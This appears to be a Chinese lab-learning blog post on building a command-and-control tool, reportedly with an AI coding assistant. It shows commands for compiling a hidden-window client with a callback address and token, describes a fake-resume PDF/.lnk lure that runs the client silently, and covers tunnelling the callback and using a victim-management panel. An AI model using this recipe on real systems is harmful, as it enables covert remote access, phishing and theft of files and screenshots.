---
title: AI Evasion 学习：Claude Code 开发 C2
date: 2026-06-01
tag: 免杀
summary: 记录 AI Evasion 学习过程，以及使用 Claude Code 辅助开发 C2 的思路。
cover: ./assets/cat-angry.png
---
# ai_evasion学习—Claude code开发c2

搭建并测试一个简单的C2，整体效果是：先启动服务端程序，然后让客户端接入到服务端，最后通过浏览器打开管理后台，在页面里查看当前在线的终端设备，并进行一些基础的运维操作，比如查看连接状态、执行简单指令、上传下载文件、查看截图等。

效果如下：

## 一、服务端

先在服务端目录里把程序编译出来，生成 `ss-server.exe`

```
go build -o ss-server.exe .
```

![image-20260518183647713](.\assets\posts\ai_evasion学习—Claude code开发c2\image-20260518183647713.png)

然后启动服务端，这里带一个 token，当成后台连接用的口令。

```
.\ss-server.exe start --token 密码
```

启动之后命令行里能看到监听端口和后台服务，说明服务端已经跑起来了。这个窗口先别关，后面客户端上线也会在这里有记录。

![image-20260518183836865](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260518183836865.png)

## 二、客服端

进入客户端目录，编译客户端的时候，把服务端地址和 token 一起写进去。

```
cd C:\Users\Jeffine\claude-code-demo\test\ss\client
go build -ldflags "-H windowsgui -X main.DefaultServer=wss://ip:8443/ws -X main.DefaultToken=密码" -o ss-client-silent.exe .
```

编译完会生成 `ss-client-silent.exe`。运行之后，后台就能看到上线记录。

![image-20260518183952089](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260518183952089.png)

## 三、后台

打开http://localhost:8080/#/

进去之后可以看到在线列表，里面有 Session ID、主机名、系统类型、地址、连接时间这些信息。客户端连上来之后，这里就会多一条记录。

![image-20260518183603169](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260518183603169.png)

## 四、测试

正常返回结果就说明连接没问题，命令发送和结果返回都是通的。

![image-20260518183213299](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260518183213299.png)

![image-20260518183506735](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260518183506735.png)

尝试把exe塞进简历pdf中，以创建lnk的方式，效果如下：

![image-20260519015425813](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260519015425813.png)

客户端打开是正常的简历（ai生成的不是真人）同时成功上线

![image-20260519015955078](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260519015955078.png)

## 五、问题修复

但是后面发现了问题因为我的物理机和虚拟机ip不在一个网段所以物理机无法上线，于是用Cpolar建立隧道进行反弹

![image-20260519015616370](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260519015616370.png)

物理机可以上线了但隧道不稳定虚拟机关机或者挂起都会更换

然后发现新的问题，上传exe的时候会报错

![image-20260519015831130](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260519015831130.png)

但上传zip可以

![image-20260519110610543](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260519110610543.png)

改成临时路径可以

![image-20260519110911517](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260519110911517.png)

又新增了一个截图功能，想看看客户端状态

![image-20260519144851927](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260519144851927.png)

原来那个有地方文字不清晰，改着改着全设计成粉色了

![image-20260519165412094](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260519165412094.png)

![image-20260519165216251](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260519165216251.png)
